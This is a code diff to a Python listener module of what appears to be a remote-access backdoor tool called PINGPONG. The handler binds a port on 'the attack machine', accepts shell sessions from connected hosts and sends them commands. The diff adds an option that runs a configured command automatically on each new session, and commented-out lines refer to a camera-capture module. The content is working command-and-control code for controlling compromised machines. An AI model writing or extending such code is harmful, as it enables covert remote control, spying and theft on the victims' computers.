@@ -9,17 +9,15 @@ import sys
 import main, config_set
 #开启监听
 #函数中printf参数决定时候进行不必要的输出
-def startserver(printf, open_ac, ip='127.0.0.1', port='624', is_input=False):
-    config_list = ["listen_Default_ip", "listen_Default_port"]
+def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True):
+    global g_is_auto
+    g_is_auto = is_auto
+    config_list = ["listen_Default_ip", "listen_Default_port", "Autocommand"]
     handler_d = main.get_value('handler')
     load_config(config_list, handler_d)
     if is_input:
         ip = input(f"handler>[*]Please input the IP for the attack machine(blank for {listen_Default_ip})>")
         port = input(f"handler>[*]Please input the PORT(blank for {listen_Default_port})>")
-    if printf and False:
-        AUTORUNSCRIPT = input("handler>[*]Any AUTORUN COMMAND?(blank for no)>")
-    else:
-        AUTORUNSCRIPT = " "
     if port == "":
         port = listen_Default_port
     if ip == "":
@@ -38,7 +36,7 @@ def startserver(printf, open_ac, ip='127.0.0.1', port='624', is_input=False):
             main.print_error(f"handler>[-]{msg}")
             main.print_error("handler>[-]Failed to bind on " + ip + ":" + port)
             main.print_normal(f"handler>[*]Bind on {listen_Default_ip}:{listen_Default_port}")
-            startserver(True, False, listen_Default_ip, listen_Default_port)
+            startserver(True, listen_Default_ip, listen_Default_port)
     except socket.error as msg:
         main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
         sys.exit(1)
@@ -59,20 +57,25 @@ def startserver(printf, open_ac, ip='127.0.0.1', port='624', is_input=False):
             main.print_normal('handler>[*]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
         # t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
         # t.start()
-        PINGPONG_shell(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac)
+        PINGPONG_shell(conn, ip, port, _ip, str(_port), True, Autocommand)
 #连接程序
-def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
+def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
     #请求发送函数：检查连接
     import PINGPONG_script.addsend
-    is_Auto = True
     while True:
-        #主循环
-        if is_Auto:
-            command = input("PINGPONG>")
+        if Autocommand and g_is_auto:
+            main.print_normal("PINGPONG>[*]running " + Autocommand)
+            command = Autocommand
+            Autocommand = False
         else:
-            print("PINGPONG>[*]running " + AUTOCOMMAND)
-            command = AUTOCOMMAND
-            is_Auto = True
+            command = input("PINGPONG>")
+        #主循环
+        # if is_Auto:
+        #     command = input("PINGPONG>")
+        # else:
+        #     print("PINGPONG>[*]running " + AUTOCOMMAND)
+        #     command = AUTOCOMMAND
+        #     is_Auto = True
         # if command == "cam_shot" or command == "CAM_SHOT":
         #     import PINGPONG_script.camera
         #     PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn)
@@ -123,5 +126,3 @@ def load_config(config_list, d):
         data = d[con]
         local_var[f'{con}'] = data
         # print(f'{con} : {data}')
-# if __name__ == "__main__":
-#     startserver(True, True, ip="127.0.0.1", port=624)
